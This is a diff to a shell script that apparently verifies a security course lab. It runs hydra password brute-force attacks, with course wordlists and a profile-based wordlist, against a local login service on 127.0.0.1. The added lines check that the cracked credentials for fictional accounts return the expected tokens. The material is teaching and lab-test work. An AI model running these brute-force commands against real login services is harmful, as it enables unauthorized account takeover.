@@ -12,9 +12,12 @@ for attempt in {1..50}; do
     sleep 0.1
 done
 run curl -fsS -d 'username=admin&password=wrong' http://127.0.0.1:8000/login
+[[ $(curl -fsS -d 'username=admin&password=wrong' http://127.0.0.1:8000/login) == '"Invalid credentials"' ]]
 run hydra -f -I -V -t 1 -L "$lab_dir/course-usernames.txt" -P "$lab_dir/course-passwords.txt" -s 8000 127.0.0.1 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'
 run curl -fsS -d 'username=admin&password=12345admin' http://127.0.0.1:8000/login
+[[ $(curl -fsS -d 'username=admin&password=12345admin' http://127.0.0.1:8000/login) == '"secret token"' ]]
 run python3 "$lab_dir/profile_words.py"
 run hydra -f -I -V -t 1 -L /tmp/lab12/profile-usernames.txt -P /tmp/lab12/profile-passwords.txt -s 8000 127.0.0.1 http-post-form '/profile-login:username=^USER^&password=^PASS^:F=Invalid'
 run curl -fsS -d 'username=demo&password=Mira1999!' http://127.0.0.1:8000/profile-login
+[[ $(curl -fsS -d 'username=demo&password=Mira1999!' http://127.0.0.1:8000/profile-login) == '"fictional profile token"' ]]
 printf '\nCHECK: both fictional accounts verified with direct HTTP requests.\n'
